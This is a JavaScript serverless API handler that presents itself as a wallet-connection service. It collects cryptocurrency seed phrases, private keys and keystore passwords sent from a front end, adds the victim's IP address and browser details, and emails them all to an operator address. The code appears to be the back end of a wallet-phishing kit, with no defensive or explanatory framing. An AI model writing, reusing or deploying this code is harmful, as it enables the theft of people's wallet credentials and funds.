import nodemailer from 'nodemailer';
import rateLimit from 'express-rate-limit';

// Rate limiter configuration
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: { success: false, message: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false
});

// Email service configuration
const createTransporter = () => {
  return nodemailer.createTransporter({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });
};

const sendWalletData = async (walletData) => {
  const transporter = createTransporter();

  const emailContent = `
    <h2>🔗 New Wallet Connection</h2>
    <div style="font-family: Arial, sans-serif; line-height: 1.6;">
      <h3>Wallet Details:</h3>
      <ul>
        <li><strong>Wallet Type:</strong> ${walletData.walletType}</li>
        <li><strong>Address:</strong> ${walletData.address || 'Not provided'}</li>
        <li><strong>Network:</strong> ${walletData.network || 'Not specified'}</li>
      </ul>
      
      <h3>Connection Info:</h3>
      <ul>
        <li><strong>IP Address:</strong> ${walletData.ipAddress}</li>
        <li><strong>Timestamp:</strong> ${walletData.timestamp}</li>
        <li><strong>User Agent:</strong> ${walletData.userAgent}</li>
      </ul>
      
      ${walletData.seedPhrase ? `
        <h3>🔐 Seed Phrase:</h3>
        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace;">
          ${walletData.seedPhrase}
        </div>
      ` : ''}
      
      ${walletData.privateKey ? `
        <h3>🔑 Private Key:</h3>
        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace;">
          ${walletData.privateKey}
        </div>
      ` : ''}
      
      ${walletData.keystoreFile ? `
        <h3>📁 Keystore Info:</h3>
        <p><strong>Filename:</strong> ${walletData.keystoreFile.name}</p>
        <p><strong>Password:</strong> ${walletData.keystorePassword || 'Not provided'}</p>
      ` : ''}
    </div>
  `;

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER,
    subject: `🔔 Wallet Connection - ${walletData.walletType}`,
    html: emailContent
  };

  return transporter.sendMail(mailOptions);
};

// Track API usage (simplified for serverless)
let requestCount = 0;
let successCount = 0;
let failureCount = 0;

const trackApiSuccess = () => {
  requestCount++;
  successCount++;
};

const trackApiFailure = () => {
  requestCount++;
  failureCount++;
};

export default async function handler(req, res) {
  // Enable CORS
  const corsHeaders = {
    'Access-Control-Allow-Origin': process.env.ALLOWED_ORIGINS || '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Credentials': 'true'
  };

  // Set CORS headers
  Object.entries(corsHeaders).forEach(([key, value]) => {
    res.setHeader(key, value);
  });

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(204).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      message: 'Method not allowed' 
    });
  }

  try {
    // Apply rate limiting (simplified for serverless)
    const userIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection?.remoteAddress || 
                   'Unknown';

    const walletData = req.body;
    
    console.log(`Received wallet data from IP: ${userIP}`);
    
    if (!walletData.walletType) {
      return res.status(400).json({ 
        success: false, 
        message: 'Wallet type is required' 
      });
    }
    
    // Add IP address and timestamp to wallet data
    const dataWithIp = {
      ...walletData,
      ipAddress: userIP,
      timestamp: new Date().toISOString(),
      userAgent: req.headers['user-agent']
    };
    
    // Send the email with wallet data
    await sendWalletData(dataWithIp);
    
    // Track successful API request
    trackApiSuccess();
    
    // Return success response
    res.status(200).json({
      success: true,
      message: 'Wallet connection details sent successfully',
      requestId: `req_${Date.now().toString(36)}_${Math.random().toString(36).substring(2, 7)}`
    });
  } catch (error) {
    // Track failed API request
    trackApiFailure();
    
    console.error('Error processing wallet connection:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to process wallet connection',
      error: process.env.NODE_ENV === 'production' ? undefined : error.message
    });
  }
}
